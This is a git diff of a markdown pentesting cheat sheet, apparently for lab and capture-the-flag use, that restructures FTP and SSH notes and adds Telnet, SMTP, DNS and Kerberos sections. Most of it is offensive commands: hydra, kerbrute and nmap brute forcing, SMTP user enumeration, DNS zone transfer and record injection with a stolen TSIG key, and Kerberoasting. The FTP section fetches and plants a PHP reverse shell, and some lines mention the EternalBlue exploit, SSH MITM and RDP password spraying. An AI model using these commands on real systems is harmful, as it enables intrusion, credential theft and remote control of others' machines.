@@ -7,28 +7,38 @@ title: Network Services Pentesting Cheat Sheet
 
 
 # Network Services Pentesting Cheat Sheet
+
+<!-- ------------------------------------------------FTP NOTES----------------------------------------------------------- -->
+
 <details markdown="1">
 <summary>FTP (21)</summary>
+<p></p>
 
+### Login
 ```bash
-#Login
 ftp <IP> #optional port
 lftp <IP>
 anonymous:anonymous
+```
 
-#Commands
+### Commands
+```bash
 cd
 ls -a # List all files (even hidden)
 put <filename> #Upload file
 get <filename> #Download file
 mput/mget #Upload/Downlaod multiple files
 quit
-
-#Download all files
+```
+### Download all files
+```bash
 wget -m ftp://anonymous:anonymous@10.10.10.98
 wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
 wget -r --user="USERNAME" --password="PASSWORD" ftp://server.com/ #If your user/password has special characters
+```
 
+### Automation
+```bash
 #nmap
 nmap --script ftp-* -p 21 <IP>
 
@@ -49,12 +59,16 @@ hydra -l username -P passwords.txt <target-ip> ftp
 hydra -L username.txt -p password <target-ip> ftp
 hydra -l username -P passwords.txt ftp://<target-ip>
 hydra -L usernames.txt -p password ftp://<target-ip>
+```
 
-#Configuration
+### Configuration
+```bash
 cat /etc/vsftpd.conf
 cat /etc/vsftpd/vsftpd.conf
+```
 
-#Reverse Shell
+### Reverse Shell
+```bash
 wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
 # Edit some variables in shell.php
 $ip = '<your-local-ip>';
@@ -69,8 +83,13 @@ http://vulnerable.com/path/to/ftp/shell.php
 ```
 </details>
 
+
+<!-- ------------------------------------------------SSH NOTES----------------------------------------------------------- -->
+
+
 <details markdown="1">
 <summary>SSH (22)</summary>
+<p></p>
 
 ### Basic commands
 ```bash
@@ -219,53 +238,387 @@ pip3 install ssh-mitm --upgrade
 # --remote-host: Specify the target ip/domain
 # --listen-port: Specify the ip address to listen in local machine
 ssh-mitm server --enable-trivial-auth --remote-host example.com --listen-port 2222
-
 ```
 
 </details>
+
+
+<!-- ------------------------------------------------TELNET NOTES----------------------------------------------------------- -->
 
 <details markdown="1">
 <summary>Telnet (23)</summary>
+<p></p>
 
+### Enumeration
 ```bash
+nmap -n -sV -Pn --script "*telnet*" -p 23 {IP}
+nmap --script telnet-encryption -p 23 <target-ip>
+nmap --script telnet-ntlm-info -p 23 <target-ip>
+nmap --script telnet-brute --script-args userdb=users.txt,passdb=passwords.txt,telnet-brute.timeout=8s -p 23 <target-ip>
+```
 
+### Configuration
+```bash
+cat /etc/inetd.conf
+# or
+cat /etc/xinetd.d/telnet
+cat /etc/xinetd.d/stelnet
+```
+
+### Connect
+```bash
+telnet <target-ip> <target-port>
+telnet <target-ip> 23
 ```
 </details>
+
+
+<!-- ------------------------------------------------SMTP NOTES----------------------------------------------------------- -->
+
 
 <details markdown="1">
 <summary>SMTP (25/465/587)</summary>
+<p></p>
 
+### Enumeration
 ```bash
+nmap --script smtp-brute -p 25,465,587 <target-ip>
+nmap --script smtp-commands -p 25,465,587 <target-ip>
+nmap --script smtp-enum-users -p 25,465,587 <target-ip>
+nmap --script smtp-ntlm-info --script-args smtp-ntlm-info.domain=example.com -p 25,465,587 <target-ip>
+nmap --script smtp-vuln-cve2011-1764 -p 25,465,587 <target-ip>
+nmap --script smtp-* -p 25,465,587 <target-ip>
 
+# MX Domains
+dig mx example.com
+
+#Metasploit
+use auxiliary/scanner/smtp/smtp_enum
+```
+
+### Users
+```bash
+# VRFY - check if the user exists in the SMTP server
+smtp-user-enum -M VRFY -u <username> -t <target-ip>
+smtp-user-enum -M VRFY -U usernames.txt -t <target-ip>
+
+# RCPT - check if the user is allowed to receive mails in the SMTP server
+smtp-user-enum -M RCPT -u <username> -t <target-ip>
+smtp-user-enum -M RCPT -U usernames.txt -t <target-ip>
+
+# EXPN - reveal the actual email address
+smtp-user-enum -M EXPN -u <username> -t <target-ip>
+smtp-user-enum -M EXPN -D <hostname> -U usernames.txt -t <target-ip>
+```
+
+### STARTTLS
+```bash
+# port 25
+openssl s_client -starttls smtp -connect <target-ip>:25
+# Port 465
+openssl s_client -crlf -connect <target-ip>:465
+# Port 587
+openssl s_client -starttls smtp -crlf -connect <target-ip>:587
+```
+
+### Connect
+```bash
+nc <target-ip> 25
+# or
+telnet <target-ip> 25
+```
+
+### Commands
+```bash
+# Identify SMTP Server
+helo example.com
+# List all supported enhanced functions
+ehlo example.com
+# 8BITMIME - allow to send 8-bit data
+# AUTH - authentication for the SMTP connection
+# CHUNKING - transfer chunks of data
+# DSN (Delivery Status Notifications) - notify delivery status
+# ENHANCEDSTATUSCODES - allow to show more details of the status
+# ETRN - process remote queue
+# EXPN - expand mailing list
+# HELP - help about commands
+# PIPELINING - allow the multiple commands
+# SIZE - maximum message size that can be received
+# SMTPUTF8 -
+# STARTTLS - communicate with TLS
+# SEND - send message to terminal
+# TURN - swap client and server
+# VRFY - check if the user exists in the SMTP server
+
+# Auth Login
+# The AUTH LOGIN command allows us to login. We need to input username/password in Base64.
+334 VXNlcm5hbWU6 # Base64-encoded "username:"
+dGVzdA== # Base64-encoded "test"
+334 UGFzc3dvcmQ6 # Base64-encoded "password:"
+cGFzc3dvcmQ= # Base64-encoded "password"
+
+# Messages
+## 1. check if the user exists
+vrfy <username>
+vrfy root
+# 2. set the address of the mail sender
+mail from: <username>
+mail from: root
+mail from: sender@example.com
+# 3. set the address of the mail recipient
+rcpt to: <username>
+rcpt to: root
+rcpt to: recipient@example.com
+# 4. send data of message (the message end with ".")
+data
+subject: Test Mail
+This is a test mail.
+
+# process remote queue
+etrn example.com
+# list the mailing list
+expn example.com
+```
+
+### Send Mail
+```bash
+# Tool https://github.com/jetmore/swaks
+swaks --to remote-user@example.com --from local-user@<local-ip> --server mail.example.com --body "hello"
+
+# --attach: Attach a file
+swaks --to remote-user@example.com --from local-user@<local-ip> --server mail.example.com --body "hello" --attach @evil.docx
+```
+
+### Start SMTP Server
+```bash
+# -n: No setuid
+# -c: Classname
+sudo python3 -m smtpd -n -c DebuggingServer 10.0.0.1:25
 ```
 </details>
+
+
+<!-- ------------------------------------------------DNS NOTES----------------------------------------------------------- -->
+
 
 <details markdown="1">
 <summary>DNS (53)</summary>
+<p></p>
 
+### Enumeration
 ```bash
+# Nmap
+nmap --script dns-nsec-enum --script-args dns-nsec-enum.domains vulnerable.com -p 53 <target-ip>
+nmap --script dns-random-srcport -p 53 <target-ip>
+nmap --script dns-recursion -p 53 <target-ip>
+nmap --script dns-service-discovery -p 53 <target-ip>
+nmap --script dns-* -p 53 <target-ip>
+nmap -n --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" <target-ip>
 
+# Get IP address from the domain
+host example.com
+
+# Reverse Lookup (Resolves domain name from IP address)
+dig -x <ip>
+dig -x 8.8.8.8
+```
+
+### Online Tools
+[https://dnsdumpster.com/](https://dnsdumpster.com/)
+
+### Subdomain Discovery
+```bash
+dnsenum --dnsserver <target-ip> -f wordlist.txt example.com
+
+# Do not scrape from Google search
+# -p: The number of google search pages
+# -s: The maximum number of subdomains that will be scraped from Google
+dnsenum --dnsserver <target-ip> --enum -p 0 -s 0 -f wordlist.txt example.com
+
+# Fuzzing
+# ffuf tool
+ffuf -w /usr/share/wordlists/dirb/small.txt -u http://victim.htb/ -H "Host: FUZZ.victim.htb" -c -fc 301
+ffuf -H "Host: FUZZ.$DOMAIN" -H "User-Agent: PENTEST" -c -w "/path/to/wordlist.txt" -u $URL
+ffuf -c -r -w "/path/to/wordlist.txt" -u "http://FUZZ.$TARGET/"
+# gobuster tool
+gobuster vhost --useragent "PENTEST" --wordlist "/path/to/wordlist.txt" --url $URL
+# wfuzz tool
+wfuzz -H "Host: FUZZ.victim.com" --hc 404,403 -H "User-Agent: PENTEST" -c -z file,"/path/to/wordlist.txt" $URL
+```
+
+### DNS Records
+```bash
+# ANY (all) record
+did example.com ANY
+dig example.com @<dns-ip> ANY
+dig example.com +nocmd +noall +answer ANY
+
+# NS (nameserver) record
+dig example.com NS
+
+# TXT record
+dig example.com TXT
+
+# Specify a public DNS server
+# Cloudflare
+dig example.com @1.1.1.1
+# Google
+dig example.com @8.8.8.8
+# Quad9
+dig example.com @9.9.9.9
+```
+
+### Zone Transfer
+The zone transfer is the process of copying the zone file on a primary DNS server to a secondary DNS server.
+```bash
+# axfr: Check if the Full Zone Transfer (AXFR) is available
+dig @<nameserver> AXFR
+dig example.com @<nameserver> AXFR
+dig example.com @example.com AXFR
+dig <zone-name> @<nameserver> AXFR
+```
+
+### BIND
+```bash
+# BIND version
+dig @<nameserver-address> chaos txt version.bind
+```
+
+### Configuration
+```bash
+# In Linux
+/etc/bind/named.conf
+/etc/bind/named.conf.options
+/etc/bind/named.conf.local
+/etc/bind/named.conf.default-zones
+
+#Example: If we found the secret key such like below, we can update DNS zone.
+# /etc/bind/named.conf
+key "rndc-key" {
+    algorithm hmac-sha256;
+    secret "zBatC828gunRa...bA=";
+};
+# We can update DNS Zone with the nsupdate command:
+# -d: Debug mode
+# -y: Set the literal TSIG (Transaction Signature) authentication key.
+nsupdate -d -y hmac-sha256:rndc-key:zBatC828gunRa...bA= 
+Creating key...
+namefromtext
+keycreate
+# Enter target domain
+> server example.com
+# Enter the new record
+# 86400: The TTL (Time-To-Live) for the DNS record. Set 86400 seconds (24 hours) here.
+# IN: Internet
+# A: A record
+# 10.0.0.1: Set your local ip address
+> update add sub.example.com 86400 IN A 10.0.0.1
+> send
+Reply from SOA query:
+...
+```
+
+### Resolve domains
+```bash
+#Edit /etc/hosts file as root to add custom domains.
+nano /etc/hosts
+
+# Add the custom domain
+10.0.0.2  vulnerable.com sub.vulnerable.com
+10.0.0.3  vulnerable2.com
+
+sudo systemctl restart systemd-hostnamed
+```
+
+### Set DNS Resolver
+```bash
+#Edit /etc/resolv.conf file as root to add custom nameservers.
+nano /etc/resolv.conf
+
+#Google
+nameserver 8.8.8.8
+nameserver 8.8.4.4
+# IPv6
+nameserver 2001:4860:4860::8888
+nameserver 2001:4860:4860::8844
+
+#Cloudflare
+nameserver 1.1.1.1
+
+sudo systemctl restart systemd-resolved.service
+```
+
+### DNS Cache
+```bash
+#Clear IP addresses or DNS records from caches.
+sudo resolvectl flush-caches
+# or
+sudo systemd-resolve --flush-cache
+
+#Check DNS caches are actually flushed
+sudo resolvectl statistics
+# or
+sudo systemd-resolve --statistics
 ```
 </details>
 
-<details markdown="1">
-<summary>POP (110/995)</summary>
+<!-- ------------------------------------------------Kerberos NOTES----------------------------------------------------------- -->
 
-```bash
-
-```
-</details>
 
 <details markdown="1">
 <summary>Kerberos (88)</summary>
+<p></p>
+
+### Enumeration
+```bash
+nmap --script krb5-enum-users --script-args krb5-enum-users.realm='example.local'-p 88 <target-ip>
+```
+
+### Bruteforce Authentication
+```bash
+#Using nmap script (brute usernames)
+nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="{Domain_Name}",userdb={Big_Userlist} {IP}
+
+
+#Using Kerbrute: https://github.com/ropnop/kerbrute (brute usernames and passwords)
+# --dc: domain controller
+# -d: domain
+# combos.txt: the wordlist specified must be combinations with "username:password".
+kerbrute bruteforce --dc 10.0.0.1 -d example.domain combos.txt
+# Users enumeration
+kerbrute userenum --dc 10.0.0.1 -d example.domain usernames.txt
+# Brute force user's password
+kerbture bruteuser --dc 10.0.0.1 -d example.domain passwords.txt username
+```
+
+### Get list of user service principal names (SPNs)
+```bash
+# If you know creds
+impacket-GetUserSPNs.py -request -dc-ip {IP} active.htb/svc_tgs
+```
+
+</details>
+
+
+<!-- ------------------------------------------------POP NOTES----------------------------------------------------------- -->
+
+
+<details markdown="1">
+<summary>POP (110/995)</summary>
+<p></p>
 
 ```bash
 
 ```
 </details>
 
+
+<!-- ------------------------------------------------SMB NOTES----------------------------------------------------------- -->
+
+
 <details markdown="1">
 <summary>SMB (139/445)</summary>
+<p></p>
 
 ### Enumeration
 ```bash
@@ -490,40 +843,64 @@ python zzz_exploit.py -target-ip <target-ip> -port 445 'username:password@target
 
 </details>
 
+
+<!-- ------------------------------------------------IMAP NOTES----------------------------------------------------------- -->
+
+
 <details markdown="1">
 <summary>IMAP (143/993)</summary>
+<p></p>
 
 ```bash
 
 ```
 </details>
+
+
+<!-- ------------------------------------------------LDAP NOTES----------------------------------------------------------- -->
+
 
 <details markdown="1">
 <summary>LDAP (389/636/3268/3269)</summary>
+<p></p>
 
 ```bash
 
 ```
 </details>
+
+
+<!-- ------------------------------------------------MSSQL NOTES----------------------------------------------------------- -->
+
 
 <details markdown="1">
 <summary>MSSQL (1433)</summary>
+<p></p>
 
 ```bash
 
 ```
 </details>
+
+
+<!-- ------------------------------------------------MYSQL NOTES----------------------------------------------------------- -->
 
 <details markdown="1">
 <summary>MysQL (3306)</summary>
+<p></p>
 
 ```bash
 
 ```
 </details>
 
+
+<!-- ------------------------------------------------RDP NOTES----------------------------------------------------------- -->
+
+
 <details markdown="1">
 <summary>RDP (3389)</summary>
+<p></p>
 
 ```bash
 #Password spraying
@@ -542,3 +919,6 @@ python3 RDPassSpray.py -U users.txt -p Spring2025! -t 10.100.10.240:3389
 
 ```
 </details>
+
+
+<!-- ------------------------------------------------qwe NOTES----------------------------------------------------------- -->
